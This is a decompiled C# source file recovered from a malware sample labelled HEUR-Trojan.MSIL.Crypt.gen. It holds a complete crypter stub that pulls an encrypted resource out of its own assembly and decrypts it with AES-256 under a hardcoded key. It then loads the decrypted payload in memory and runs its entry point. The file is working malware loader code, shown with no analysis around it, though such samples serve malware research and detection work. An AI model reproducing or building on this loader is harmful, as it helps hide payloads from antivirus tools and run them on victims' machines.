// Decompiled with JetBrains decompiler
// Type: Stub.cMain
// Assembly: Tool, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A218455A-F72E-4828-A015-B4308C141375
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan.MSIL.Crypt.gen-c9c0437a95c733d790a7b5e2b21065337ff4c840bfeaafe372c0aefec3ee852d.exe

using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

namespace Stub
{
  internal static class cMain
  {
    private static byte[] bSalt = new byte[8];

    public static byte[] Decrypt(byte[] bData, byte[] bKey)
    {
      byte[] numArray = (byte[]) null;
      using (MemoryStream memoryStream = new MemoryStream())
      {
        using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
        {
          rijndaelManaged.KeySize = 256;
          rijndaelManaged.BlockSize = 128;
          Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bKey, cMain.bSalt, 1000);
          rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
          rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
          rijndaelManaged.Mode = CipherMode.CBC;
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
          {
            cryptoStream.Write(bData, 0, bData.Length);
            cryptoStream.Close();
          }
          numArray = memoryStream.ToArray();
        }
      }
      return numArray;
    }

    [STAThread]
    private static void Main()
    {
      using (Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("E83E5487"))
      {
        if (manifestResourceStream == null)
          return;
        byte[] numArray = new byte[manifestResourceStream.Length];
        manifestResourceStream.Read(numArray, 0, numArray.Length);
        Assembly.Load(cMain.Decrypt(numArray, Encoding.Default.GetBytes("E83E5487GU501BLMDPE60UTKYED04ROV91RQ8KHG"))).EntryPoint.Invoke((object) null, (object[]) null);
      }
    }
  }
}
